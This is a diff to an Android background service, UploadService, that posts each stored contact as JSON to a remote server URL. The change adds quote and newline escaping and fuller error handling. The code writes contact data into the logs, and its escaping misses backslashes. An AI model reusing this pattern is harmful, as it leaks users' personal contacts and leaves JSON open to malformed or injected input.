@@ -13,8 +13,11 @@ import android.provider.MediaStore;
 import android.provider.Settings;
 import android.util.Log;
 
+import java.io.BufferedReader;
 import java.io.File;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.ConnectException;
 import java.net.HttpURLConnection;
@@ -97,7 +100,7 @@ public class UploadService extends Service {
         for (String contact : contacts) {
             try {
                 // Create JSON payload for contact
-                String payload = "{\"type\":\"contact\",\"data\":\"" + contact + "\"}";
+                String payload = "{\"type\":\"contact\",\"data\":\"" + escapeSpecialChars(contact) + "\"}";
                 sendPostRequest(serverUrl, payload);
             } catch (Exception e) {
                 Log.e(TAG, "Failed to upload contact: " + contact, e);
@@ -116,33 +119,56 @@ public class UploadService extends Service {
         }
     }
 
+    // Escape special characters in the string to avoid JSON formatting issues
+    private String escapeSpecialChars(String input) {
+        return input.replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r");
+    }
 
     private void sendPostRequest(String serverUrl, String payload) throws IOException {
-       try{ // Set up connection
-        URL url = new URL(serverUrl);
-        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
-        connection.setRequestMethod("POST");
-        connection.setRequestProperty("Content-Type", "application/json");
-        connection.setDoOutput(true);
+        HttpURLConnection connection = null;
+        try {
+            // Set up connection
+            URL url = new URL(serverUrl);
+            connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("POST");
+            connection.setRequestProperty("Content-Type", "application/json");
+            connection.setDoOutput(true);
 
-        // Write payload to output stream
-        try (OutputStream os = connection.getOutputStream()) {
-            byte[] input = payload.getBytes("utf-8");
-            os.write(input, 0, input.length);
+            // Write payload to output stream
+            try (OutputStream os = connection.getOutputStream()) {
+                byte[] input = payload.getBytes("utf-8");
+                os.write(input, 0, input.length);
+            }
+
+            // Get the response code from the server
+            int responseCode = connection.getResponseCode();
+            if (responseCode == HttpURLConnection.HTTP_OK) {
+                Log.d(TAG, "Upload successful: " + payload);
+            } else {
+                // Read the response body for more detailed error info
+                InputStream errorStream = connection.getErrorStream();
+                if (errorStream != null) {
+                    BufferedReader reader = new BufferedReader(new InputStreamReader(errorStream));
+                    StringBuilder errorResponse = new StringBuilder();
+                    String line;
+                    while ((line = reader.readLine()) != null) {
+                        errorResponse.append(line);
+                    }
+                    Log.e(TAG, "Failed to upload: " + payload + ". Server responded with: " + responseCode + " - " + errorResponse.toString());
+                } else {
+                    Log.e(TAG, "Failed to upload: " + payload + ". Server responded with: " + responseCode);
+                }
+            }
+
+        } catch (IOException e) {
+            Log.e("Upload", "Error uploading file", e);
+        } finally {
+            if (connection != null) {
+                connection.disconnect();
+            }
         }
-
-        // Get the response from the server
-        int responseCode = connection.getResponseCode();
-        if (responseCode == HttpURLConnection.HTTP_OK) {
-            Log.d(TAG, "Upload successful: " + payload);
-        } else {
-            Log.e(TAG, "Failed to upload: " + payload + ". Server responded with: " + responseCode);
-        }
-
-    } catch (IOException e) {
-        Log.e("Upload", "Error uploading file", e);
     }
-    }
+
 
     @Override
     public IBinder onBind(Intent intent) {
